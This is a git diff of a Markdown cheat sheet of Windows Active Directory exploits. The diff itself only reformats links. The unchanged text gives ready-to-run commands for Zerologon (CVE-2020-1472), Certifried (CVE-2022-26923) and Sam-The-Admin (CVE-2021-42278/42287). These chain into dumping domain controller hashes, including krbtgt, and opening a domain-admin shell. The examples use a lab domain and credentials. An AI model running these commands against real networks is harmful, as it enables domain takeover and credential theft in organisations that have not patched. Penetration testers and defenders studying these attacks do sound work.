@@ -1,14 +1,14 @@
 # Windows
 
 ## CVE-2020-1472 : Zero Logon
-PoC based on this link : https://github.com/dirkjanm/CVE-2020-1472
+PoC based on this link : <https://github.com/dirkjanm/CVE-2020-1472>
 ```bash
 python3 cve-2020-1472-exploit.py HOSTNAME IP
 impacket-secretsdump 'HOSTNAME$@IP'
 ```
 
 ## CVE-2022-26923 : Certifried
-More info in : https://cravaterouge.github.io/ad/privesc/2022/05/11/bloodyad-and-CVE-2022-26923.html
+More info in : <https://cravaterouge.github.io/ad/privesc/2022/05/11/bloodyad-and-CVE-2022-26923.html>
 ```bash
 python3 bloodyAD.py -d crashlab.local -u testuser -p 'totoTOTOtoto1234*' --host 10.100.10.12 addComputer cve 'CVEPassword1234*'
 python3 bloodyAD.py -d crashlab.local -u testuser -p 'totoTOTOtoto1234*' --host 10.100.10.12 setAttribute 'CN=cve,CN=Computers,DC=crashlab,DC=local' dNSHostName '["CRASHDC.crashlab.local"]'
@@ -22,7 +22,7 @@ impacket-secretsdump -user-status -just-dc-ntlm -just-dc-user krbtgt 'crashlab.l
 ```
 
 ## CVE-2021-42278 & CVE-2021-42287 : Sam-The-Admin
-Impersonate DA from standard domain user. Based on https://github.com/WazeHell/sam-the-admin
+Impersonate DA from standard domain user. Based on <https://github.com/WazeHell/sam-the-admin>
 ```bash
 python3 sam_the_admin.py -domain-netbios NETBIOS_NAME -dc-ip IP_DC -shell 'DOMAIN/USERNAME:PASSWORD'
 ```
